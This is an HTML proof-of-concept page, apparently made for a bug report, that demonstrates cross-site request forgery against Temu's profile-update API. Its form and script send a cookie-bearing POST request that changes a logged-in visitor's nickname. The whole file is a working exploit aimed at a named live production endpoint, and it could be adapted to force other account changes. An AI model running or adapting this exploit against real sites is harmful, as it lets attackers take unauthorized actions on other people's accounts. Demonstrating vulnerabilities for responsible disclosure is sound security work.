<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>CSRF PoC - Temu Profile Update</title>
</head>
<body>
  <h2>CSRF PoC - Update Nickname</h2>
  <form id="csrfForm" method="POST" action="https://www.temu.com/api/bg-barbera-api/user/profile/update" enctype="application/json">
    <input type="hidden" name="type" value="nickname">
    <input type="hidden" name="nickname" value="Hunt">
    <input type="hidden" name="trp_track" value="">
    <button type="button" onclick="submitCSRF()">Submit CSRF</button>
  </form>

  <div id="error" style="color:red; margin-top:20px;"></div>

  <script>
    function submitCSRF() {
      const data = JSON.stringify({
        type: "nickname",
        nickname: "Hunt",
        trp_track: null
      });

      fetch("https://www.temu.com/api/bg-barbera-api/user/profile/update", {
        method: "POST",
        headers: {
          "Content-Type": "application/json;charset=UTF-8"
          // Normally no auth headers are set in CSRF
        },
        body: data,
        credentials: "include" // Critical to include cookies for CSRF
      })
      .then(response => {
        if (!response.ok) {
          return response.text().then(text => {
            document.getElementById("error").textContent = "Request failed: " + text;
          });
        } else {
          document.getElementById("error").textContent = "Request sent. Check for nickname change.";
        }
      })
      .catch(err => {
        document.getElementById("error").textContent = "Fetch error: " + err;
      });
    }
  </script>
</body>
</html>
